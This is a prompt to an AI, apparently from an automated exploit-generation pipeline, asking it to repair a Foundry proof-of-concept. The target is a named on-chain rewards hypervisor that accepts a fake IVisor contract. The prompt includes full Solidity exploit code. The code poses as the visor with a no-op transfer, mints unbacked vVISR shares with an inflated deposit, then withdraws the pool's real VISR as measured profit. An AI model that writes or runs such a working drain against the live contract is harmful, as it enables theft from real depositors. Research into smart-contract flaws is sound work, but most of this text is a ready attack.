You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: A fake `IVisor` contract can mint completely unbacked shares and drain all VISR
- claim: For contract depositors, the hypervisor trusts any address with code as an `IVisor` and only checks that `IVisor(from).owner() == msg.sender`. It never verifies that `delegatedTransferERC20` actually transferred VISR, nor does it measure the received balance delta. An attacker can deploy a contract whose `owner()` returns the attacker and whose `delegatedTransferERC20()` is a no-op, then call `deposit` with any nominal amount and still receive freshly minted vVISR shares.
- impact: An attacker can mint an arbitrarily large share balance without contributing any VISR, then redeem a proportional amount of the real VISR already held by the hypervisor, draining honest depositors.
- exploit_paths: ["Attacker deploys a contract implementing `owner()` and `delegatedTransferERC20()`.", "`owner()` returns the attacker and `delegatedTransferERC20()` does not transfer VISR.", "Attacker calls `deposit(hugeAmount, fakeVisor, attacker)`.", "The hypervisor mints shares as though the VISR was received.", "Attacker withdraws those shares against the real VISR in the pool."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IRewardsHypervisorLike {
    function visr() external view returns (address);
    function vvisr() external view returns (address);
    function deposit(uint256 visrDeposit, address payable from, address to) external returns (uint256 shares);
    function withdraw(uint256 shares, address to, address payable from) external returns (uint256 rewards);
}

contract FlawVerifier {
    address public constant TARGET = 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef;
    uint256 private constant SHARE_INFLATION_MULTIPLIER = 1_000_000;

    uint256 private _profitAmount;
    uint256 public depositAmountUsed;
    uint256 public mintedShares;
    uint256 public visrBalanceBefore;
    uint256 public visrBalanceAfter;
    uint256 public shareSupplyBefore;
    uint256 public shareSupplyAfter;
    bool public executed;
    bool public depositSucceeded;
    bool public withdrawSucceeded;

    constructor() {}

    function executeOnOpportunity() external {
        require(!executed, "already executed");
        executed = true;

        IRewardsHypervisorLike hypervisor = IRewardsHypervisorLike(TARGET);
        address visrToken = hypervisor.visr();
        address shareToken = hypervisor.vvisr();

        visrBalanceBefore = IERC20Like(visrToken).balanceOf(address(this));
        shareSupplyBefore = IERC20Like(shareToken).totalSupply();
        uint256 shareBalanceBefore = IERC20Like(shareToken).balanceOf(address(this));

        uint256 hypervisorVisrBalance = IERC20Like(visrToken).balanceOf(TARGET);
        if (hypervisorVisrBalance == 0) {
            return;
        }

        uint256 amount = _selectDepositAmount(hypervisorVisrBalance, shareSupplyBefore);
        if (amount == 0) {
            return;
        }

        depositAmountUsed = amount;

        uint256 returnedShares;
        try hypervisor.deposit(amount, payable(address(this)), address(this)) returns (uint256 shares) {
            depositSucceeded = true;
            returnedShares = shares;
        } catch {
            return;
        }

        uint256 shareBalanceAfter = IERC20Like(shareToken).balanceOf(address(this));
        if (shareBalanceAfter > shareBalanceBefore) {
            mintedShares = shareBalanceAfter - shareBalanceBefore;
        } else {
            mintedShares = returnedShares;
        }

        if (mintedShares == 0) {
            return;
        }

        try hypervisor.withdraw(mintedShares, address(this), payable(address(this))) returns (uint256) {
            withdrawSucceeded = true;
        } catch {
            return;
        }

        visrBalanceAfter = IERC20Like(visrToken).balanceOf(address(this));
        shareSupplyAfter = IERC20Like(shareToken).totalSupply();

        if (visrBalanceAfter > visrBalanceBefore) {
            _profitAmount = visrBalanceAfter - visrBalanceBefore;
        }
    }

    function owner() external view returns (address) {
        return address(this);
    }

    function delegatedTransferERC20(address, address, uint256) external view {
        require(msg.sender == TARGET, "only hypervisor");
    }

    function profitToken() external view returns (address) {
        return IRewardsHypervisorLike(TARGET).visr();
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _selectDepositAmount(uint256 hypervisorVisrBalance, uint256 shareSupply) internal pure returns (uint256 amount) {
        amount = hypervisorVisrBalance;
        if (amount > type(uint256).max / SHARE_INFLATION_MULTIPLIER) {
            amount = type(uint256).max / SHARE_INFLATION_MULTIPLIER;
        } else {
            amount = amount * SHARE_INFLATION_MULTIPLIER;
        }

        if (amount == 0) {
            amount = 1;
        }

        if (shareSupply != 0) {
            uint256 maxSafeAmount = type(uint256).max / shareSupply;
            if (maxSafeAmount <= 1) {
                return 0;
            }
            if (amount >= maxSafeAmount) {
                amount = maxSafeAmount - 1;
            }
        }
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
